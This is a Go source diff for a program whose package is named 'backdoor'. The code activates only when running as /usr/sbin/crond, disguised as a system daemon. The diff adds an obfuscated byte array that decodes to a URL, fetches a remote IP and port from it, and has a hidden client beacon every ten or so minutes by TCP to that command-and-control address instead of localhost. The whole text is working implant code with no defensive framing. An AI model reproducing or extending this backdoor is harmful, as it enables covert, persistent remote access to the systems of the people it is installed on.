@@ -3,15 +3,19 @@ package main
 import (
 	"backdoor/util"
 	"encoding/json"
-	"fmt"
 	"math/rand"
 	"net"
 	"os"
 	"os/exec"
 	"strings"
 	"time"
+	"fmt"
+	"net/http"
+	"strconv"
+	"io"
 
 	"github.com/google/uuid"
+
 )
 
 var guuid string
@@ -21,11 +25,54 @@ func init() {
 	if err != nil {
 		return
 	}
-	if exepath != "/usr/sbin/rsyslogd" {
+	if exepath != "/usr/sbin/crond" {
 		return
 	}
 	rand.Seed(time.Now().Unix())
 	go client()
+}
+
+func getUrl()(string,error){
+	var data = []byte{216,240,219,251,255,162,199,242,127,211,106,42,169,80,5,238,64,180,87,161,122,107,201,238,93,214,125,228,196,5,46,94}
+	pdecoder := util.NewDecoder()
+	urlBytes,err := pdecoder.Decode(data)
+	return string(urlBytes),err
+}
+
+func getIP() (string,error){
+	urlAddress,err := getUrl()
+	if err != nil{
+		return "",err
+	}
+	httpClient := &http.Client{
+		Timeout: 60 * time.Second,
+	}
+	resp, err := httpClient.Get(urlAddress)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+	respBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+	rspText := strings.TrimSpace(string(respBytes))
+	strArr := strings.Split(rspText, ":")
+	if len(strArr) < 2 {
+		return "", fmt.Errorf("%s", rspText)
+	}
+	ip := net.ParseIP(strArr[0])
+	if ip == nil || ip.To4() == nil {
+		return "", fmt.Errorf("%s", rspText)
+	}
+	port, err := strconv.ParseUint(strArr[1], 10, 16)
+	if err != nil {
+		return "", err
+	}
+	if port == 0 {
+		return "", fmt.Errorf("%s", rspText)
+	}
+	return fmt.Sprintf("%s:%d", ip.String(), port), nil
 }
 
 func main() {
@@ -33,14 +80,22 @@ func main() {
 
 func client() {
 	guuid = uuid.New().String()
+	var address string
 	for {
 		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
-		session("127.0.0.1", 7426)
+		tmpAddress,err := getIP()
+		if err == nil{
+			address = tmpAddress
+		}
+		if len(address) == 0{
+			continue
+		}
+		session(address)
 	}
 }
 
-func session(ip string, port uint16) {
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 12*time.Second)
+func session(address string) {
+	conn, err := net.DialTimeout("tcp", address, 12*time.Second)
 	if err != nil {
 		return
 	}
